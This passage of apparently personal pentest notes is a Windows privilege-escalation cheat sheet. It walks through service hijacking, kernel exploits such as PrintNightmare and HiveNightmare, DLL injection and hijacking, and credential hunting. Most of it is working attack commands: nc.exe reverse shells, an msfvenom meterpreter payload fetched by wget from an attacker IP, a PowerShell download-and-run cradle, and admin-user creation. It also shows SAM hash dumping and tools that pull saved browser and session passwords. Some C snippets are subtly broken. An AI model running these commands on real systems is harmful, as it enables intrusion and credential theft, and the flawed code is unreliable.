-    C:\Program Files
-    C:\Program Files (x86)\System
-    C:\Program Files (x86)\System Explorer\service\SystemExplorerService64

### Querying Service

`C:\> sc qc SystemExplorerHelpService`

If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, NT AUTHORITY\SYSTEM.

- C:\Program.exe\
- C:\Program Files (x86)\System.exe

### Searching for Unquoted Service Paths

`C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`

### Permissive Registry ACLs

It is also worth searching for weak service ACLs in the Windows Registry. We can do this using accesschk.

`C:\> accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services`

### Changing ImagePath with PowerShell

`PS C:\> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`


## Modifiable Registry Autorun Binary

We can use WMIC to see what programs run at system startup.
```
PS C:\> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl


wmic startup get caption,command 2>nul & ^
```
## folders for startup binaries
```
C:\>dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul

C:\>dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
C:\>dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul

C:\>dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul

C:\>Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"

C:\>Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
# Kernel Exploits

[Security Update Guide](   https://msrc.microsoft.com/update-guide/vulnerability  )


### Notable Vulnerabilities

**MS08-067** - This was a remote code execution vulnerability in the "Server" service due to improper handling of RPC requests. 
- Windows Server 2000, 2003, and 2008 and Windows XP and Vista


**MS17-010** - Also known as EternalBlue is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the Shadow Brokers leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account. 


**ALPC Task Scheduler 0-Day** - The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to .job files located in the C:\Windows\tasks directory. An attacker could leverage this to create a hard link to a file that the attacker controls.The exploit for this flaw used the [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN) API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\SYSTEM via the Spooler service.
[blog](  https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html  )


**CVE-2021-36934 HiveNightmare, aka SeriousSam** is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. 

[usefull blog](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5  )

[exploit](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe)

[mitigation](  https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1 )



## Checking Permissions on the SAM File

We can check for this vulnerability using icacls to check permissions on the SAM file.

`C:\> icacls c:\Windows\System32\config\SAM`
        
Successful exploitation also requires the presence of one or more shadow copies.
Remember that these 3 files are locked by the operating system.

Most Windows 10 systems will have System Protection enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw


## Performing Attack and Parsing Password Hashes

[exploit used](https://github.com/GossiTheDog/HiveNightmare)
```

PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe

$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local

```
        
        PS C:\> .\CVE-2021-36934.exe



**CVE-2021-1675/CVE-2021-34527 PrintNightmare** is a flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege SeLoadDriverPrivilege the ability to add drivers to a remote Print Spooler. 

[C# RCE Poc](  https://github.com/cube0x0/CVE-2021-1675  ) 

[Local Powershell exploitation](  https://github.com/calebstewart/CVE-2021-1675  )


## Local Exploitation

### Checking for Spooler Service

`PS C:\> ls \\localhost\pipe\spoolss`

### Adding Local Admin with PrintNightmare PowerShell PoC

- First start by bypassing the execution policy on the target host:

```
PS C:\> Set-ExecutionPolicy Bypass -Scope Process

PS C:\> Import-Module .\CVE-2021-1675.ps1

PS C:\> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```





                -Enumerating Missing Patches


        Examining Installed Updates

        PS C:\> systeminfo
        PS C:\> wmic qfe list brief  (  Viewing Installed Updates with WMI )
        PS C:\> Get-Hotfix

        We can search for each KB (Microsoft Knowledge Base ID number) in the Microsoft Update Catalog to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for KB5000808 shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.

        (https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) Ms knowledge catalog


        -CVE-2020-0668 Example

        Next, let's exploit Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability, which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a .OLD extension when the service is triggered. This move operation is performed by NT AUTHORITY\SYSTEM, and can be abused to move a file of our choosing with the help of mount points and symbolic links.

        -Checking Current User Privileges

        C:\> whoami /priv

        We can use this exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

        ( https://github.com/RedCursorSecurityConsulting/CVE-2020-0668 )

        At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as UsoDllLoader or DiagHub to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

        We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.

            C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 


        -Checking Permissions on Binary

        C:\> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

        C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)


        Generating Malicious Binary

        $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe


        Downloading the binary

        For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.

        We need to do this because running the exploit corrupts the malicious version of maintenanceservice.exe that is moved to (our copy in c:\Users\-student\Desktop that we are targeting) c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe which we will need to account for later. If we attempt to utilize the copied version, we will receive a system error 216 because the .exe file is no longer a valid binary. 

        PS C:\> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe

        -Running

        C:\> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                       

        
        -Checking Permissions of New File

        C:\> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'


        -Replacing File with Malicious Binary



We can overwrite the maintenanceservice.exe binary in c:\Program Files (x86)\Mozilla Maintenance Service with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to C:\Users\-student\Desktop, maintenanceservice.exe and maintenanceservice2.exe. Let's move the good copy that was not corrupted by the exploit maintenanceservice2.exe to the Program Files directory, making sure to rename the file properly and remove the 2 or the service won't start. The copy command will only work from a cmd.exe window, not a PowerShell console.

        C:\> copy /Y C:\Users\-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
        
        
        -Exploit
        
        C:\> net start MozillaMaintenance 






# Vulnerable Services

        
### Enumerating Installed Programs
```
C:\> wmic product get name

PS > foreach ($UKey in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\Wow6432node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\SOFTWARE\Wow6432node\Microsoft\Windows\CurrentVersion\Uninstall\*'){foreach ($Product in (Get-ItemProperty $UKey -ErrorAction SilentlyContinue)){if($Product.DisplayName -and $Product.SystemComponent -ne 1){$Product.DisplayName}}}

```


### Enumerating Local Ports

`C:\> netstat -ano | findstr 6064`

### Enumerating Process Service

`PS C:\> get-process -Id 3324`

`PS C:\> get-service | ? {$_.DisplayName -like 'Druva*'}`


### Druva inSync Windows Client Local Privilege Escalation Example

[POC](https://www.exploit-db.com/exploits/49211)

For our purposes, we want to modify the $cmd variable to our desired command. We can do many things here, such as adding a local admin user (which is a bit noisy, and we want to avoid modifying things on client systems wherever possible) or sending ourselves a reverse shell. Let's try this with [Invoke-PowerShellTcp.ps1](  https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1  ). Aappend the following at the bottom of the script file:
        
`Invoke-PowerShellTcp -Reverse -IPAddress attack_ip -Port 9443`

Modify the $cmd variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.

`$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://IPV4:8080/shell.ps1')"`

Finally, start a Netcat listener on the attack box and execute the PoC PowerShell script on the target host (after modifying the PowerShell execution policy with a command such as Set-ExecutionPolicy Bypass -Scope Process).

`$ nc -lvnp 9443`





# DLL Injection


        DLL injection is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.

        DLL injection finds legitimate applications in various areas. For instance, software developers leverage this technology for hot patching, a method that enables the amendment or updating of code seamlessly, without the need to restart the ongoing process immediately. 


        -LoadLibrary

        LoadLibrary is a widely utilized method for DLL injection, employing the LoadLibrary API to load the DLL into the target process's address space.

        The LoadLibrary API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.

       
       
        #include <windows.h>
        #include <stdio.h>

        int main() {
        // Using LoadLibrary to load a DLL into the current process
        HMODULE hModule = LoadLibrary("example.dll");
        if (hModule == NULL) {
                printf("Failed to load example.dll\n");
                return -1;
        }
        printf("Successfully loaded example.dll\n");

        return 0;
        }







        #include <windows.h>
        #include <stdio.h>

        int main() {
        // Using LoadLibrary for DLL injection
        // First, we need to get a handle to the target process
        DWORD targetProcessId = 123456 // The ID of the target process
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
        if (hProcess == NULL) {
                printf("Failed to open target process\n");
                return -1;
        }

        // Next, we need to allocate memory in the target process for the DLL path
        LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (dllPathAddressInRemoteMemory == NULL) {
                printf("Failed to allocate memory in target process\n");
                return -1;
        }

        // Write the DLL path to the allocated memory in the target process
        BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
        if (!succeededWriting) {
                printf("Failed to write DLL path to target process\n");
                return -1;
        }

        // Get the address of LoadLibrary in kernel32.dll
        LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        if (loadLibraryAddress == NULL) {
                printf("Failed to get address of LoadLibraryA\n");
                return -1;
        }

        // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
        if (hThread == NULL) {
                printf("Failed to create remote thread in target process\n");
                return -1;
        }

        printf("Successfully injected example.dll into target process\n");

        return 0;
        }



        
      HANDLE OpenProcess(
        [in] DWORD dwDesiredAccess,
        [in] BOOL  bInheritHandle,
        [in] DWORD dwProcessId
        );




        [in] dwDesiredAccess

        The access to the process object. This access right is checked against the security descriptor for the process. This parameter can be one or more of the process access rights.

        If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor.

        
        [in] bInheritHandle

        If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle.


        [in] dwProcessId

        The identifier of the local process to be opened.


        Return value

        If the function succeeds, the return value is an open handle to the specified process.
        If the function fails, the return value is NULL.





        LPVOID VirtualAllocEx(
        [in]           HANDLE hProcess,
        [in, optional] LPVOID lpAddress,
        [in]           SIZE_T dwSize,
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect
        );




                [in] hProcess

                The handle to a process. The function allocates memory within the virtual address space of this process.The handle must have the PROCESS_VM_OPERATION access right.

                [in, optional] lpAddress

                The pointer that specifies a desired starting address for the region of pages that you want to allocate.

                If you are reserving memory, the function rounds this address down to the nearest multiple of the allocation granularity.
                If lpAddress is NULL, the function determines where to allocate the region.

                [in] dwSize

                The size of the region of memory to allocate, in bytes.


                [in] flAllocationType


                MEM_COMMIT
                0x00001000

                MEM_RESERVE
                0x00002000


                MEM_RESET
                0x00080000


                MEM_RESET_UNDO
                0x1000000


                MEM_LARGE_PAGES
                0x20000000


                MEM_PHYSICAL
                0x00400000


                MEM_TOP_DOWN
                0x00100000

                
                
                [in] flProtect

The memory protection for the region of pages to be allocated. If the pages are being committed, you can specify any one of the memory protection constants.


        Return value

If the function succeeds, the return value is the base address of the allocated region of pages.




                BOOL WriteProcessMemory(
                [in]  HANDLE  hProcess,
                [in]  LPVOID  lpBaseAddress,
                [in]  LPCVOID lpBuffer,
                [in]  SIZE_T  nSize,
                [out] SIZE_T  *lpNumberOfBytesWritten
                );


        [in] lpBaseAddress

        A pointer to the base address in the specified process to which data is written. Before data transfer occurs, the system verifies that all data in the base address and memory of the specified size is accessible for write access, and if it is not accessible, the function fails.

        [in] lpBuffer

A pointer to the buffer that contains data to be written in the address space of the specified process.

        [in] nSize

The number of bytes to be written to the specified process.

        [out] lpNumberOfBytesWritten

A pointer to a variable that receives the number of bytes transferred into the specified process. This parameter is optional. If lpNumberOfBytesWritten is NULL, the parameter is ignored.

        Return value

If the function succeeds, the return value is nonzero.






                -Manual Mapping

        Manual Mapping is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations. However, it avoids easy detection by not using the LoadLibrary function, whose usage is monitored by security and anti-cheat systems.

        A simplified outline of the process can be represented as follows:

        Load the DLL as raw data into the injecting process.
       
        Map the DLL sections into the targeted process.
       
        Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.



                -Reflective DLL Injection

        (https://github.com/stephenfewer/ReflectiveDLLInjection  )


        "The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the 'host process'). Second, the library must be loaded into the host process to meet the library's runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.

        Assuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.



 1   Execution control is transferred to the library's ReflectiveLoader function, an exported function found in the library's export table. This can happen either via CreateRemoteThread() or a minimal bootstrap shellcode.
 
 2   As the library's image currently resides in an arbitrary memory location, the ReflectiveLoader initially calculates its own image's current memory location to parse its own headers for later use.
 
 3   The ReflectiveLoader then parses the host process's kernel32.dll export table to calculate the addresses of three functions needed by the loader, namely LoadLibraryA, GetProcAddress, and VirtualAlloc.
 
 4   The ReflectiveLoader now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
 
 5   The library's headers and sections are loaded into their new memory locations.
 
 6   The ReflectiveLoader then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
 
 7   The ReflectiveLoader then processes the newly loaded copy of its image's relocation table.
 
 8   The ReflectiveLoader then calls its newly loaded image's entry point function, DllMain, with DLL_PROCESS_ATTACH. The library has now been successfully loaded into memory.
 
 9   Finally, the ReflectiveLoader returns execution to the initial bootstrap shellcode that called it, or if it were called via CreateRemoteThread, the thread would terminate."




# DLL Hijacking


        DLL Hijacking is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.

        The default DLL search order used by the system depends on whether Safe DLL Search Mode is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.


        Press Windows key + R to open the Run dialog box.
        
        Type in Regedit and press Enter. This will open the Registry Editor.
        
        Navigate to HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager.
        
        In the right pane, look for the SafeDllSearchMode value. If it does not exist, right-click the blank space of the folder or right-click the Session Manager folder, select New and then DWORD (32-bit) Value. Name this new value as SafeDllSearchMode.
        
        Double-click SafeDllSearchMode. In the Value data field, enter 1 to enable and 0 to disable Safe DLL Search Mode.
        
        Click OK, close the Registry Editor and Reboot the system for the changes to take effect.



        With this mode enabled, applications search for necessary DLL files in the following sequence:

              1  The directory from which the application is loaded.
              2  The system directory.
              3  The 16-bit system directory.
              4  The Windows directory.
              5  The current directory.
              6  The directories that are listed in the PATH environment variable.


        However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

              1  The directory from which the application is loaded.
              2  The current directory.
              3  The system directory.
              4  The 16-bit system directory.
              5  The Windows directory
              6  The directories that are listed in the PATH environment variable


        DLL Hijacking involves a few more steps. First, you need to pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:

        Process Explorer: Part of Microsoft's Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.
        
        PE Explorer: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.

        After identifying a DLL, the next step is determining which functions you want to modify, which necessitates reverse engineering tools, such as disassemblers and debuggers. Once the functions and their signatures have been identified, it's time to construct the DLL.






        #include <stdio.h>
        #include <stdlib.h>
        #include <stdbool.h>
        #include <windows.h>

        typedef int (*AddFunc)(int, int);

        int readIntegerInput()
        {
        int value;
        char input[100];
        bool isValid = false;

        while (!isValid)
        {
                fgets(input, sizeof(input), stdin);

                if (sscanf(input, "%d", &value) == 1)
                {
                isValid = true;
                }
                else
                {
                printf("Invalid input. Please enter an integer: ");
                }
        }

        return value;
        }

        int main()
        {
        HMODULE hLibrary = LoadLibrary("library.dll");
        if (hLibrary == NULL)
        {
                printf("Failed to load library.dll\n");
                return 1;
        }

        AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
        if (add == NULL)
        {
                printf("Failed to locate the 'Add' function\n");
                FreeLibrary(hLibrary);
                return 1;
        }
        HMODULE hLibrary = LoadLibrary("x.dll");

        printf("Enter the first number: ");
        int a = readIntegerInput();

        printf("Enter the second number: ");
        int b = readIntegerInput();

        int result = add(a, b);
        printf("The sum of %d and %d is %d\n", a, b, result);

        FreeLibrary(hLibrary);
        system("pause");
        return 0;
        }

        It loads an add function from the library.dll and utilises this function to add two numbers. Subsequently, it prints the result of the addition. By examining the program in Process Monitor (procmon), we can observe the process of loading the library.dll located in the same directory.

        First, let's set up a filter in procmon to solely include main.exe, which is the process name of the program. This filter will help us focus specifically on the activities related to the execution of main.exe. It is important to note that procmon only captures information while it is actively running. Therefore, if your log appears empty, you should close main.exe and reopen it while procmon is running. This will ensure that the necessary information is captured and available for analysis.


        We can further filter for an Operation of Load Image to only get the libraries the app is loading.



        -Proxying


        Create a new library: We will create a new library serving as the proxy for library.dll. This library will contain the necessary code to load the Add function from library.dll and perform the required tampering.
        
        Load the Add function: Within the new library, we will load the Add function from the original library.dll. This will allow us to access the original function.
        
        Tamper with the function: Once the Add function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add + 1 to the result.
        
        Return the modified function: After completing the tampering process, we will return the modified Add function from the new library back to main.exe. This will ensure that when main.exe calls the Add function, it will execute the modified version with the intended changes.




        // tamper.c
        #include <stdio.h>
        #include <Windows.h>

        #ifdef _WIN32
        #define DLL_EXPORT __declspec(dllexport)
        #else
        #define DLL_EXPORT
        #endif

        typedef int (*AddFunc)(int, int);

        DLL_EXPORT int Add(int a, int b)
        {
        // Load the original library containing the Add function
        HMODULE originalLibrary = LoadLibraryA("library.o.dll");
        if (originalLibrary != NULL)
        {
                // Get the address of the original Add function from the library
                AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
                if (originalAdd != NULL)
                {
                printf("============ HIJACKED ============\n");
                // Call the original Add function with the provided arguments
                int result = originalAdd(a, b);
                // Tamper with the result by adding +1
                printf("= Adding 1 to the sum to be evil\n");
                result += 1;
                printf("============ RETURN ============\n");
                // Return the tampered result
                return result;
                }
        }
        // Return -1 if the original library or function cannot be loaded
        return -1;
        }



        Either compile it or use the precompiled version provided. Rename library.dll to library.o.dll, and rename tamper.dll to library.dll.

Running main.exe then shows the successful hack.



                -Invalid Libraries

        Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in .dll and has a status of NAME NOT FOUND we can find such libraries in main.exe.

        #include <stdio.h>
        #include <Windows.h>

        BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
        {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
                printf("Hijacked... Oops...\n");
        }
        break;
        case DLL_PROCESS_DETACH:
                break;
        case DLL_THREAD_ATTACH:
                break;
        case DLL_THREAD_DETACH:
                break;
        }
        return TRUE;
        }







# Credential Hunting
                       
        
### Application Configuration Files

`PS C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml`

### Chrome Dictionary Files

`PS C:\> gc 'C:\Users\-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password`

### Unattended Installation Files

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the unattend.xml are stored in plaintext or base64 encoded.

`PS> Get-ChildItem -Path / passwd -Recurse -ErrorAction Ignore | Select-Object Name,Directory | fl`

### PowerShell History File

Default and ussual ps history file is:

`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

### Confirming PowerShell History Save Path

But we can check just to be sure:

`PS C:\> (Get-PSReadLineOption).HistorySavePath`

### Reading PowerShell History Files


Access all history files in a box if we have admin privs:

`PS C:\> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`


### PowerShell Credentials(DPAPI)

        PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using DPAPI, which typically means they can only be decrypted by the same user on the same computer they were created on.

#### example

```
        # Connect-VC.ps1
        # Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
        $encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
        $decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
        Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $encryptedString
```

#### Decrypting PowerShell Credentials

```
PS C:\> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

        bob

PS C:\> $credential.GetNetworkCredential().password

        Str0ng3ncryptedP@ss!
```


## Other Files

In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as .kdbx, .vmdk, .vdhx, .ppk, etc.

### Manually Searching the File System for Credentials

[swisskyrepo](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

`C:\> cd c:\Users\-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt`

### Search File Contents with PowerShell

`PS C:\> select-string -Path C:\Users\-student\Documents\*.txt -Pattern password`

### Search for File Extensions - Example 1

`C:\> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`

### Search for File Extensions - Example 2

`C:\> where /R C:\ *.config`


### Search for File Extensions Using PowerShell

`PS C:\> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore`


### Sticky Notes Passwords

This file is located at:

- C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite 


#### Viewing Sticky Notes Data Using PowerShell

This can also be done with PowerShell using the [PSSQLite](  https://github.com/RamblingCookieMonster/PSSQLite  ) module.

        
```

PS C:\> Set-ExecutionPolicy Bypass -Scope Process

PS C:\> cd .\PSSQLite\
PS C:\> Import-Module .\PSSQLite.psd1

PS C:\> $db = 'C:\Users\-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

PS C:\> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```


#### Strings to View DB File Contents

`$  strings plum.sqlite-wal`


### Other Files of Interest

```
        %SYSTEMDRIVE%\pagefile.sys
        %WINDIR%\debug\NetSetup.log
        %WINDIR%\repair\sam
        %WINDIR%\repair\system
        %WINDIR%\repair\software, %WINDIR%\repair\security
        %WINDIR%\iis6.log
        %WINDIR%\system32\config\AppEvent.Evt
        %WINDIR%\system32\config\SecEvent.Evt
        %WINDIR%\system32\config\default.sav
        %WINDIR%\system32\config\security.sav
        %WINDIR%\system32\config\software.sav
        %WINDIR%\system32\config\system.sav
        %WINDIR%\system32\CCM\logs\*.log
        %USERPROFILE%\ntuser.dat
        %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
        %WINDIR%\System32\drivers\etc\hosts
        C:\ProgramData\Configs\*
        C:\Program Files\Windows PowerShell\*
```


        

## Cmdkey Saved Credentials



The cmdkey command can be used to create, list, and delete stored usernames and passwords.

`C:\> cmdkey /list`

We can also attempt to reuse the credentials using runas to send ourselves a reverse shell 

`PS C:\> runas /savecred /user:inlanefreight\bob "COMMAND HERE"`


## Browser Credentials

We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

`PS C:\> .\SharpChrome.exe logins /unprotect`


## Password Managers
         
If we find a .kdbx file on a server, workstation, or file share, we know we are dealing with a KeePass database which is often protected by just a master password. If we can download a .kdbx file to our attacking host, we can use a tool such as keepass2john to extract the password hash and run it through a password cracking tool such as Hashcat or John the Ripper.


`$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx `


- hash mode 13400 for KeePass

`$ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`


## Email clients

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).



## Running All LaZagne Modules

We can find web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms i.e., Autologon, Credman, DPAPI, LSA secrets, etc. , with [Lazagne](https://github.com/AlessandroZ/LaZagne)

`PS C:\> .\lazagne.exe all`


## Running SessionGopher as Current User

We can use SessionGopher to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It searches the HKEY_USERS hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. 

We need local admin access to retrieve stored session information for every user in HKEY_USERS, but it is always worth running as our current user to see if we can find any useful credentials.

```
PS C:\> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01

```



## Windows AutoLogon

The registry keys associated with Autologon can be found under HKEY_LOCAL_MACHINE in the following hive, and can be accessed by standard users:

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

The typical configuration of an Autologon account involves the manual setting of the following registry keys:

- AdminAutoLogon - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
- DefaultUserName  
- DefaultPassword 


#### Enumerating Autologon with reg.exe

`C:\>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`



## Putty

`Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>`


```
PS C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

